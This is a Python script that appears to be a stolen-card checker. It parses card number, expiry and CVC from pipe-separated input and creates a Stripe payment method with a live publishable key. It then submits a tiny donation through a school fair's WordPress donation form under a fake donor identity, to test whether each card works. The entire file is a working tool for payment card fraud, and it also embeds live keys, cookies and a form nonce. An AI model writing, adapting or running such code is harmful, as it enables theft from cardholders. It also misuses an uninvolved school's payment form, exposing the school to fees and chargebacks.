import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51HcB4eIo6MPGyX5VVW5HNTrgx7KY6QEnzdCGUxXhirfBNQdZM7mSDIh7uyO4Hr1g4OnLvOFTnCYxOInUmGDp5FPU00Iswym70q'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
	    '__stripe_mid': 'ab9cd1ac-ca82-473d-922f-91827ebeb4d136804e',
	    '__stripe_sid': '361501c7-680b-495b-99ea-43e8341734ff8987fe',
	}
	
	headers = {
	    'authority': 'www.sfaconcord.org',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=ab9cd1ac-ca82-473d-922f-91827ebeb4d136804e; __stripe_sid=361501c7-680b-495b-99ea-43e8341734ff8987fe',
	    'origin': 'https://www.sfaconcord.org',
	    'pragma': 'no-cache',
	    'referer': 'https://www.sfaconcord.org/parents/falcon-fair/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1725048363118',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=10383&_fluentform_126_fluentformnonce=0f46483922&_wp_http_referer=%2Fparents%2Ffalcon-fair%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&names_2%5Blast_name%5D=&dropdown_59=8&email=rodamuser59%40outlook.com&phone=&payment_input_23=200&iq7=&payment_input_19=50&iq15=&payment_input_12=250&iq14=&payment_input_8=75&iq24=&payment_input_17=5&iq20=&payment_input_34=0&iq34=&payment_input_1=50&iq1=&payment_input_3=35&iq2=&payment_input_24=25&iq5=&payment_input_5=150&iq8=&payment_input_32=125&iq9=&payment_input_28=50&iq28=&payment_input_33=25&iq29=&payment_input_18=25&iq19=&payment_input_4=0&iq13=&payment_input_13=75&iq16=&payment_input_16=0&iq18=&payment_input_30=85&iq11=&payment_input_31=10&iq164=&payment_input_7=15&iq10=&payment_input_29=20&iq17=&custom-payment-amount_4=0.5&dropdown=Credit%20Card&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '126',
	}
	
	r2 = requests.post(
	    'https://www.sfaconcord.org/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	return (r2.json())
